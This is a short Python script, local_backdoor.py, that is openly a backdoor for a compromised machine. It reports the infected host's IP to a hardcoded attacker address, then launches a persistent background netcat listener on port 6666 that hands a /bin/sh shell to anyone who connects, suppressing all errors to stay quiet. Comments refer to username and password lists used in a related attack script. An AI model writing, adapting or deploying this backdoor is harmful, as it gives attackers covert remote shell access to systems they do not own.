""" local_backdoor.py : executed once it is placed in a target system
    Creates a netcar listener that listens on port 6666 for incoming connections
    Once a connection is established, a remote shell will spawn for the attacker
    Also reports that it has been infected back to the initial IP
"""
import sys
import os
from subprocess import call
import nclib
import socket

def main():
    """ Main function - used to set up a netcat listener """
    # sys_info stores 3 useful variables:
    # 0: root ip to report to
    # 1: target username
    # 2: target password

    try:
        #call("python backdoor.py usernames.txt passwords.txt".split(" "))
        #192.168.1.1 is the attacker IP
        nc = nclib.Netcat(('192.168.1.3',1234))

        #IP Retrieval from https://stackoverflow.com/a/30990617htt
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80))
        thisIP = s.getsockname()[0]

        nc.send(thisIP)
        call(["nohup netcat -l -p 6666 -e /bin/sh &"], shell=True)
    except Exception as somethingbadhappened:
        pass


if __name__ == "__main__":
    main()
